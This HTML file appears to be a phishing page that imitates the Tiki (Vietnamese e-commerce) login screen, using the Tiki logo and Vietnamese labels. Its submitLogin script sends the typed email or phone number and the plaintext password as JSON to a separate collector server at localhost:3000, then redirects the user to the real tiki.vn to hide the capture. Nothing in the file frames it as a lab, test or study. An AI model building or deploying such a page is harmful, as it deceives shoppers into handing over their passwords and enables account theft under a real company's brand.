<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Đăng nhập</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    />
    <style>
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background: linear-gradient(to bottom, #93c5fd, #dbeafe);
        font-family: Arial, sans-serif;
      }
      .login-container {
        background: white;
        padding: 20px;
        border-radius: 12px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        width: 350px;
        text-align: center;
      }
      .login-container img {
        width: 50px;
        margin-bottom: 10px;
      }
      .login-container input,
      .password-container input {
        width: 100%;
        height: 42px;
        padding: 10px;
        margin: 8px 0;
        border: 1px solid #ccc;
        border-radius: 6px;
        font-size: 16px;
        box-sizing: border-box;
      }
      .password-container {
        position: relative;
        width: 100%;
        display: flex;
        align-items: center;
      }
      .password-container input {
        flex: 1;
        padding-right: 40px;
      }
      .password-container .toggle-password {
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        cursor: pointer;
        color: gray;
        font-size: 18px;
      }
      .login-btn {
        width: 100%;
        padding: 10px;
        background: #facc15;
        color: white;
        border: none;
        border-radius: 6px;
        font-weight: bold;
        cursor: pointer;
        margin-top: 10px;
      }
      .social-login {
        display: flex;
        justify-content: space-between;
        margin-top: 10px;
      }
      .social-btn {
        flex: 1;
        padding: 8px;
        margin: 0 5px;
        color: white;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        text-decoration: none;
      }
      .facebook {
        background: #1877f2;
      }
      .google {
        background: #db4437;
      }
      .apple {
        background: black;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <img
        src="https://cdn.tgdd.vn/2020/03/GameApp/tiki-200x200.jpg"
        alt="Tiki"
      />
      <h2>Đăng nhập</h2>
      <input
        type="text"
        id="emailOrPhone"
        placeholder="Nhập Email hoặc Số điện thoại"
      />
      <div class="password-container">
        <input type="password" id="password" placeholder="Nhập mật khẩu" />
        <i
          class="fa-solid fa-eye toggle-password"
          onclick="togglePassword()"
        ></i>
      </div>
      <button class="login-btn" onclick="submitLogin()">Đăng nhập</button>
      <p>Hoặc, đăng nhập bằng</p>
      <div class="social-login">
        <a class="social-btn facebook" href="https://www.facebook.com/login">
          <i class="fa-brands fa-facebook-f"></i> Facebook
        </a>
        <a class="social-btn google" href="https://accounts.google.com/signin">
          <i class="fa-brands fa-google"></i> Google
        </a>
        <a
          class="social-btn apple"
          href="https://appleid.apple.com/auth/authorize"
        >
          <i class="fa-brands fa-apple"></i> Apple
        </a>
      </div>
    </div>

    <script>
      function togglePassword() {
        const passwordInput = document.getElementById("password");
        const icon = document.querySelector(".toggle-password");
        if (passwordInput.type === "password") {
          passwordInput.type = "text";
          icon.classList.replace("fa-eye", "fa-eye-slash");
        } else {
          passwordInput.type = "password";
          icon.classList.replace("fa-eye-slash", "fa-eye");
        }
      }

      function submitLogin() {
        const emailOrPhone = document.getElementById("emailOrPhone").value;
        const password = document.getElementById("password").value;

        const data = {
          emailOrPhone: emailOrPhone,
          password: password,
        };

        fetch("http://localhost:3000/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.success) {
              window.location.href = "https://tiki.vn/";
            } else {
              alert(data.message);
            }
          })
          .catch((error) => console.error("Lỗi:", error));
      }
    </script>
  </body>
</html>
